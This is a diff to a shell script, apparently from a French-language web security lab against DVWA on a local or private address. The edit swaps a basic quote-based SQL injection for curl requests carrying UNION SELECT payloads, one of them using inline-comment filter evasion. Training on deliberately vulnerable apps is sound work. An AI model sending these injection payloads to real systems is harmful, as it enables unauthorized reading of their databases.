@@ -25,14 +25,11 @@ echo ""
 
 # ── Payload 1 — REMPLACEZ PAR VOTRE ATTAQUE ────────────────────────────────
 # echo "[1] Payload basique..."
-echo "http://localhost:8080/vulnerabilities/sqli/?id=%27+or+1%3D1%23&Submit=Submit#"
-RESULT=$(curl -s -b "$COOKIE_FILE" \
-  "http://$TARGET:$PORT/vulnerabilities/sqli/?id=TEST1&Submit=Submit" \
-  -o /dev/null -w "%{http_code}")
-echo "    HTTP $RESULT"
+curl  "http://172.20.0.10/vulnerabilities/sqli/?id=1+UNION+SELECT+1,2--&Submit=Submit"
+
 
 # ── Payload 2 ───────────────────────────────────────────────────────────────
-
+curl "http://172.20.0.10/vulnerabilities/sqli/?id=1+UN%2F**%2FION+SEL%2F**%2FECT+1,2--&Submit=Submit" | grep -i "first name"
 
 # ── Payload 3 ───────────────────────────────────────────────────────────────
 
